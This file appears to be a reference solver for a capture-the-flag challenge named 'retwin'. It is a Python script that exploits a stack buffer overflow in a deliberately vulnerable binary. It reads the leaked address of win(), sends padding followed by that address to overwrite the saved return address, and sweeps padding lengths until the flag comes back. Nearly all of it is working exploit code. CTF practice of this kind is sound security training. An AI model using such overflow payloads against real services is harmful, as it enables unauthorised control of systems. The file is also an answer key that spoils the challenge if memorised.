"""Reference solver for retwin: ret2win stack overflow.

    python3 solve.py <host> <port>

The binary is non-PIE and prints win()'s address on connect. The exact offset
from the 64-byte buffer to the saved return address depends on the compiler's
frame layout (saved rbp, alignment), so rather than hardcode it we sweep a small
range of padding lengths and stop at the one that lands on win() — the flag comes
back prefixed with "WIN".
"""
import re
import socket
import struct
import sys
import time


def attempt(host, port, pad):
    s = socket.socket()
    s.settimeout(5)
    s.connect((host, port))
    banner = b""
    # read until we've seen the leaked address and the prompt
    s.settimeout(2)
    try:
        while b"name?" not in banner:
            chunk = s.recv(4096)
            if not chunk:
                break
            banner += chunk
    except socket.timeout:
        pass
    m = re.search(rb"win\(\) is at (0x[0-9a-fA-F]+)", banner)
    if not m:
        s.close()
        return None
    win = int(m.group(1), 16)
    payload = b"A" * pad + struct.pack("<Q", win)
    s.sendall(payload)
    time.sleep(0.2)
    out = b""
    s.settimeout(2)
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
    except socket.timeout:
        pass
    s.close()
    if b"WIN" in out:
        mm = re.search(rb"WIN\n(flag\{[^}]*\})", out)
        return mm.group(1).decode() if mm else out.decode(errors="replace")
    return None


def main():
    host, port = sys.argv[1], int(sys.argv[2])
    # buffer is 64 bytes; saved rbp (+8) then return address — sweep to be robust
    for pad in range(64, 121, 8):
        flag = attempt(host, port, pad)
        if flag:
            print(flag)
            return
    print("no offset in range landed on win()", file=sys.stderr)
    sys.exit(1)


if __name__ == "__main__":
    main()
